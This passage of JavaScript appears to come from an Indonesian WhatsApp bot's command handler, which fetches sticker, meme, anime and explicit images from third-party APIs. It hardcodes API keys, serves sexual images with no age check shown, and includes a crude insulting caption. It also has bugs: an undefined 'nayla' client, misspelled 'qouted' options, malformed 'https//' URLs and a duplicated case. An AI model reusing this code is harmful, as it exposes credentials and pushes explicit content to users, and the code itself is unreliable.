                dppa = args.join(" ")                
                dapuhy = await getBuffer(`https://api.xteam.xyz/attp?file&text=${dppa}`)
                client.sendMessage(from, dapuhy, sticker, {quoted: ftroli})                
                break
                case 'ttp':
                case 'ttp2':
                case 'ttp3':
                case 'ttp4':
                case 'amongus':                
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                dppa = args.join(" ")                
                dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${LolHuman}&text=${dppa}`)
                client.sendMessage(from, dapuhy, sticker, {quoted: ftroli})                
                break;
                case 'carbon':                 
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                dppa = args.join(" ")                
                dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/carbon?apikey=${LolHuman}&code=${dppa}`)
                client.sendMessage(from, dapuhy, image, {quoted: ftroli})                
                break;															
                case 'memeindo':				
				anu = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=Alphabott`) 
				oyy = await getBuffer(anu.result)
				client.sendMessage(from, oyy, image, {quoted: ftroli})				
				break;
				case 'estetikpic':				
				anu = await fetchJson(`https://api.zeks.xyz/api/estetikpic?apikey=Alphabott`) 
				oyy = await getBuffer(anu.result)
				client.sendMessage(from, oyy, image, {quoted: ftroli})				
				break;
                case 'shutdown':
                if (!mek.key.fromMe) return reply('*Kamu Owner?*')
	        await client.sendMessage(from, `Bot gua of...\n_Gua off dulu yaa.._`, text,{quoted : mek})
		await sleep(3000)
                client.close()
		break;
		case 'fox':                                       
                   anu = await fetchJson(`https://some-random-api.ml/img/fox`)
                   anu1 = await getBuffer(anu.link)
                   client.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, qouted: mek})
                   break;
       case 'dog':                                       
                   anu = await fetchJson(`https://some-random-api.ml/img/dog`)
                   anu1 = await getBuffer(anu.link)
                   client.sendMessage(from, anu1, image, {caption: `mirip lu kontol:v`, qouted: mek})
                   break;
       case 'cat':                     	                   
                   anu = await fetchJson(`https://some-random-api.ml/img/cat`)
                   anu1 = await getBuffer(anu.link)
                   client.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, qouted: mek})
                   break;
       case 'panda':                    	                   
                   anu = await fetchJson(`https://some-random-api.ml/img/panda`)
                   anu1 = await getBuffer(anu.link)
                   client.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, qouted: mek})
                   break;
       case 'panda1':                                      
                   anu = await fetchJson(`https://some-random-api.ml/img/red_panda`)
                   anu1 = await getBuffer(anu.link)
                   client.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, qouted: mek})
                   break;
       case 'bird':                                       
                   anu = await fetchJson(`https://some-random-api.ml/img/birb`)
                   anu1 = await getBuffer(anu.link)
                   nayla.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, qouted: mek})
                   break;
      case 'koala':                   
                   anu = await fetchJson(`https://some-random-api.ml/img/koala`)
                   anu1 = await getBuffer(anu.link)
                   client.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, qouted: mek})
                   break;
       case 'meme':                                       
                   anu = await fetchJson(`https://some-random-api.ml/meme`)
                   anu1 = await getBuffer(anu.image)
                   client.sendMessage(from, anu1, image, {caption: `nih kak`, qouted: mek})
                   break;
                    case 'trapnime':                                       
                   anu = await fetchJson('https://waifu.pics/api/nsfw/trap')
                   anu1 = await getBuffer(anu.image)
                   client.sendMessage(from, anu1, image, {caption: `nih kak`, qouted: mek})
                   break;
                    case 'waifu7':                                       
                   anu = await fetchJson('https://janbot-api.herokuapp.com/api/sfw/waifu')
                   anu1 = await getBuffer(anu.image)
                   client.sendMessage(from, anu1, image, {caption: `nih kak`, qouted: mek})
                   break;
                   case 'waifu8':                                       
                   anu = await fetchJson(`https://recoders-area.caliph.repl.co/api/waifu?apikey=FreeApi`)
                   anu1 = await getBuffer(anu.image)
                   client.sendMessage(from, anu1, image, {caption: `nih kak`, qouted: mek})
                   break;
				   case 'nsfwlesbi':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwcumsluts':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwpusy':                                       
                  buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwboobs':                                       
buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
                    case 'nsfwkuni':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
 case 'nsfwerofeet':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
 case 'nsfwholo':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
 case 'nsfwholoero':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
 case 'nsfwhentai':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
 case 'nsfwfeet':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwbj':                                       
                  buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwspank':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				    case 'nsfwclasic':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwyuri':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwtrap':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwpussy':                                       
                  buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwtits':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwgirls':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwfemdom':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwkitsune':                                       
                  buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwketa':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwfutanari':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				 case 'nsfweroyuri':                                       
                     buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfweroneko':                                       
                   buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;
				   case 'nsfwanal':
				   reply (mess.wait)
buff = await getBuffer(`https://api.dapuhy.ga/api/nsfw/${command}?apikey=idoganz`)
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
imageMsg = (await client.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
buttonsMessage = {footerText:'jangan lupa donasi bos', imageMessage: imageMsg,
contentText:`©Xtream bot`,buttons,headerType:4}
prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli})
client.relayWAMessage(prep)
break;              
				   case 'neko7':                                       
                   anu = await fetchJson('https://janbot-api.herokuapp.com/api/sfw/neko')
                   anu1 = await getBuffer(anu.image)
                   client.sendMessage(from, anu1, image, {caption: `nih kak`, qouted: mek})                       
                   break;
                   case 'awoo7':                                       
                   anu = await fetchJson('https://janbot-api.herokuapp.com/api/sfw/awoo')
                   anu1 = await getBuffer(anu.image)
                   client.sendMessage(from, anu1, image, {caption: `nih kak`, qouted: mek})                       
                   break;
                   case 'waifu':					
					gatauda = body.slice(7)					
					data = await fetchJson('https://waifu.pics/api/sfw/waifu')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					 case 'megumin':					
					gatauda = body.slice(9)					
					data = await fetchJson('https://waifu.pics/api/sfw/megumin')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					 case 'neko':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/neko')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'smug':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/neko')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'neko4':					
					gatauda = body.slice(7)					
					data = await fetchJson('https://waifu.pics/api/nsfw/neko')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'waifu4':					
					gatauda = body.slice(8)					
					data = await fetchJson('https://waifu.pics/api/nsfw/waifu')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'trap4':					
					gatauda = body.slice(7)					
					data = await fetchJson('https://waifu.pics/api/nsfw/trap')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'blowjob4':					
					gatauda = body.slice(10)					
					data = await fetchJson('https://waifu.pics/api/nsfw/blowjob')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'slap':                   
                    if (mentioned.length !== 0){
                    fetchJson ('https://www.nekos.life/api/v2/img/slap').then(({url}) => {
                    client.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {
                    await sleep(2000);mentions(`@${mentioned[0].split('@')[0]} slapped @${sender.split('@')[0]}`, [sender, mentioned[0]], true)})
                    })
                } else {
                    reply(`Penggunaan ${command} @tag`)
                }
                 break;
                case 'pat':                   
                    if (mentioned.length !== 0){
                    fetchJson ('https://www.nekos.life/api/v2/img/pat').then(({url}) => {
                    client.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {
                    await sleep(2000);mentions(`@${sender.split('@')[0]} pat @${mentioned[0].split('@')[0]}`, [sender, mentioned[0]], true)})
                    })
                } else {
                    reply(`Penggunaan ${command} @tag`)
                }
                 break;
                case 'baka2':                   
                    if (mentioned.length !== 0){
                    fetchJson ('https://www.nekos.life/api/v2/img/baka').then(({url}) => {
                    client.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {
                    await sleep(2000);mentions(`@${mentioned[0].split('@')[0]} Baka!!`, [sender, mentioned[0]], true)})
                    })
                } else {
                    reply(`Penggunaan ${command} @tag`)
                }
                 break;
                case 'hug2':                  
                    if (mentioned.length !== 0){
                    fetchJson ('https://www.nekos.life/api/v2/img/hug').then(({url}) => {
                    client.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {
                    await sleep(2000);mentions(`@${mentioned[0].split('@')[0]} hugged @${sender.split('@')[0]}`, [sender, mentioned[0]], true)})
                    })
                } else {
                    reply(`Penggunaan ${command} @tag`)
                }
                 break;
                case 'cium':                   
                    if (mentioned.length !== 0){
                    fetchJson ('https://www.nekos.life/api/v2/img/kiss').then(({url}) => {
                    client.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {
                    await sleep(2000);mentions(`@${mentioned[0].split('@')[0]} kissed @${sender.split('@')[0]}`, [sender, mentioned[0]], true)})
                    })
                } else {
                    reply(`Penggunaan ${command} @tag`)
                }
                 break;
					case 'cringe':					
					gatauda = body.slice(8)					
					data = await fetchJson('https://waifu.pics/api/sfw/cringe')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'shinobu':					
					gatauda = body.slice(9)					
					data = await fetchJson('https://waifu.pics/api/sfw/shinobu')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'awoo':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/awoo')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'slap2':					
					gatauda = body.slice(7)					
					data = await fetchJson('https://waifu.pics/api/sfw/slap')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'awoo0':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/awoo')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'kiss':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/kiss')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'pat':					
					gatauda = body.slice(5)					
					data = await fetchJson('https://waifu.pics/api/sfw/pat')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'kill':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/kill')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'kick2':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/kick')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'cry':					
					gatauda = body.slice(5)					
					data = await fetchJson('https://waifu.pics/api/sfw/cry')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'nom':					
					gatauda = body.slice(5)					
					data = await fetchJson('https://waifu.pics/api/sfw/nom')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'bite':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/bite')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'wink':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/wink')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'blush':					
					gatauda = body.slice(7)					
					data = await fetchJson('https://waifu.pics/api/sfw/blush')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'lick':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/lick')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'wave':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/wave')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'cuddle':					
					gatauda = body.slice(8)					
					data = await fetchJson('https://waifu.pics/api/sfw/cuddle')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'bully':					
					gatauda = body.slice(7)					
					data = await fetchJson('https://waifu.pics/api/sfw/bully')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'bonk':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/bonk')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'yeet':					
					gatauda = body.slice(6)					
					data = await fetchJson('https://waifu.pics/api/sfw/yeet')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'happy':					
					gatauda = body.slice(8)					
					data = await fetchJson('https://waifu.pics/api/sfw/happy')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'smile':					
					gatauda = body.slice(7)					
					data = await fetchJson('https://waifu.pics/api/sfw/smile')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					case 'highfive':					
					gatauda = body.slice(10)					
					data = await fetchJson('https://waifu.pics/api/sfw/highfive')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;
					 case 'hentai':					
					gatauda = body.slice(8)					
					data = await fetchJson('https://waifu.pics/api/sfw/hentai')
					hasil = await getBuffer(data.url)
					client.sendMessage(from, hasil, image, {qouted: mek})					
					break;					
					case 'crazy':	
				const cangti = [`https//c.top4top.io/p_2050zk9jt1.jpg`,`https//d.top4top.io/p_20502smph2.jpg`,`https//e.top4top.io/p_2050e7bba3.jpg`,`https//f.top4top.io/p_20507s3ld4.jpg`,`https//h.top4top.io/p_20501fjfa6.jpg`,`https//i.top4top.io/p_20502ip1a7.jpg`,`https//g.top4top.io/p_20503fxzg5.jpg`,`https//i.top4top.io/p_20502ip1a7.jpg`,`https//j.top4top.io/p_2050wssm28.jpg`,`https//k.top4top.io/p_205082nae0.jpg`,`https//l.top4top.io/p_2050h87gn1.jpg`]
		         let cangtip = cangti[Math.floor(Math.random() * cangti.length)]               
				 client.sendMessage(from, cangtip, image, {quote: mek})
				break;		
						case 'asupan':
				client.updatePresence(from, Presence.composing) 
				if (!isGroup) return reply(mess.groupo())
				reply(mess.wait)
				 data = fs.readFileSync('./lib/asupan.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 asupan = await getBuffer(randKey.result)
                 client.sendMessage(from, asupan, video, {quoted: mek, caption: '\`\`\`ASUPAN GAN:V\`\`\`'})				 
				break;  					
					//asupan
                    case 'asupan1':
					reply(mess.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/asupan?apikey=${LolHuman}`)
                    buffer = await getBuffer(get_result.result)
                    client.sendMessage(from, buffer, video, { quoted: ftroli, mimetype: Mimetype.mp4, filename: "asupan.mp4" })
                    break;
          case 'asupan2':
          reply(mess.wait)
          alamalveer = await getBuffer(`https://api.xteam.xyz/shitpost?APIKEY=${XteamKey}`)
          client.sendMessage(from, alamalveer, video, {imageMessage: 'video/mp4', filename: `asupan_bangsa.mp4`, quoted: mek, caption: 'asupannya'})
          break;
          case 'sound12':  
                   const sound12 = fs.readFileSync('sound/sound12.mp3')
                    client.sendMessage(from, sound12, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break                
                    case 'sound13':  
                    const sound13 = fs.readFileSync('sound/sound13.mp3')
                    client.sendMessage(from, sound13, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break                
                    case 'sound14':  
                      const sound14 = fs.readFileSync('sound/sound14.mp3')
                    client.sendMessage(from, sound14, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break                
                    case 'sound15':  
                    const sound15 = fs.readFileSync('sound/sound15.mp3')
                    client.sendMessage(from, sound15, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                    break                
                    case 'sound16':  
                    const sound16 = fs.readFileSync('sound/sound16.mp3')
